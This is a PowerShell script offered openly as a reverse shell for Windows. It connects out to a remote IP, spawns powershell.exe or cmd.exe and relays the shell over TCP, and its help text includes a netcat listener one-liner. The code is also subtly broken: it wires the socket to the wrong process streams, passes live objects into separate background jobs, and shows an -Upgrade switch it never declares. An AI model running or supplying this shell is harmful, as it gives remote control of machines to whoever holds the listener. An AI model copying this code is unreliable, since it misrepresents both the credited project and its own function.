function Invoke-ConPtyShell {
    <#
        .SYNOPSIS
            ConPtyShell - Fully Interactive Reverse Shell for Windows 
            Author: splinter_code
            License: MIT
            Source: https://github.com/antonioCoco/ConPtyShell
        
        .DESCRIPTION
            ConPtyShell - Fully interactive reverse shell for Windows
            
            Properly set the rows and cols values. You can retrieve it from
            your terminal with the command "stty size".
            
            You can avoid to set rows and cols values if you run your listener
            with the following command:
                stty raw -echo; (stty size; cat) | nc -lvnp 3001
           
            If you want to change the console size directly from powershell
            you can paste the following commands:
                $width=80
                $height=24
                $Host.UI.RawUI.BufferSize = New-Object Management.Automation.Host.Size ($width, $height)
                $Host.UI.RawUI.WindowSize = New-Object -TypeName System.Management.Automation.Host.Size -ArgumentList ($width, $height)
            
            
        .PARAMETER RemoteIp
            The remote IP to connect.
        .PARAMETER RemotePort
            The remote port to connect.
        .PARAMETER Rows
            Rows size for the console. Default: 24.
        .PARAMETER Cols
            Cols size for the console. Default: 80.
        .PARAMETER CommandLine
            The command-line of the process that you are going to interact with. Default: "powershell.exe".
            
        .EXAMPLE  
            PS>Invoke-ConPtyShell 10.0.0.2 3001
            
            Description
            -----------
            Spawn a reverse shell.

        .EXAMPLE
            PS>Invoke-ConPtyShell -RemoteIp 10.0.0.2 -RemotePort 3001 -Rows 30 -Cols 90
            
            Description
            -----------
            Spawn a reverse shell with specific rows and cols size.
            
         .EXAMPLE
            PS>Invoke-ConPtyShell -RemoteIp 10.0.0.2 -RemotePort 3001 -Rows 30 -Cols 90 -CommandLine cmd.exe
            
            Description
            -----------
            Spawn a reverse shell (cmd.exe) with specific rows and cols size.
            
        .EXAMPLE
            PS>Invoke-ConPtyShell -Upgrade -Rows 30 -Cols 90
            
            Description
            -----------
            Upgrade your current shell with specific rows and cols size.
            
    #>
    Param (
        [Parameter(Position = 0)]
        [String]
        $RemoteIp,
        
        [Parameter(Position = 1)]
        [String]
        $RemotePort,
        
        [Parameter(Position = 2)]
        [Int]
        $Rows = 24,
        
        [Parameter(Position = 3)]
        [Int]
        $Cols = 80,
        
        [Parameter(Position = 4)]
        [String]
        $CommandLine = "powershell.exe"
    )

    # Create a TCP client connection
    $client = New-Object System.Net.Sockets.TcpClient($RemoteIp, $RemotePort)

    # Get the network stream from the TCP client
    $stream = $client.GetStream()

    # Create a process start info object
    $psi = New-Object System.Diagnostics.ProcessStartInfo
    $psi.FileName = $CommandLine
    $psi.RedirectStandardInput = $true
    $psi.RedirectStandardOutput = $true
    $psi.UseShellExecute = $false

    # Create a new process and start it
    $process = New-Object System.Diagnostics.Process
    $process.StartInfo = $psi
    $process.Start()

    # Get the process standard streams
    $stdin = $process.StandardInput
    $stdout = $process.StandardOutput

    # Set the console buffer and window size
    $Host.UI.RawUI.BufferSize = New-Object Management.Automation.Host.Size($Cols, $Rows)
    $Host.UI.RawUI.WindowSize = New-Object Management.Automation.Host.Size($Cols, $Rows)

    # Create byte arrays for reading and writing data
    $bytesRead = New-Object byte[] 1024
    $bytesWritten = New-Object byte[] 1024

    # Function to asynchronously read data from the stream
    $readAsync = {
        param ($stream, $stdout, $bytesRead)
        while ($true) {
            $read = $stream.Read($bytesRead, 0, $bytesRead.Length)
            if ($read -le 0) { break }
            $stdout.BaseStream.Write($bytesRead, 0, $read)
            $stdout.Flush()
        }
    }

    # Function to asynchronously write data to the stream
    $writeAsync = {
        param ($stream, $stdin, $bytesWritten)
        while ($true) {
            $write = $stdin.BaseStream.Read($bytesWritten, 0, $bytesWritten.Length)
            if ($write -le 0) { break }
            $stream.Write($bytesWritten, 0, $write)
            $stream.Flush()
        }
    }

    # Start asynchronous read and write operations
    Start-Job -ScriptBlock $readAsync -ArgumentList $stream, $stdout, $bytesRead | Out-Null
    Start-Job -ScriptBlock $writeAsync -ArgumentList $stream, $stdin, $bytesWritten | Out-Null

    # Wait for all jobs to complete
    Get-Job | Wait-Job | Remove-Job

    # Close the TCP client connection
    $client.Close()
}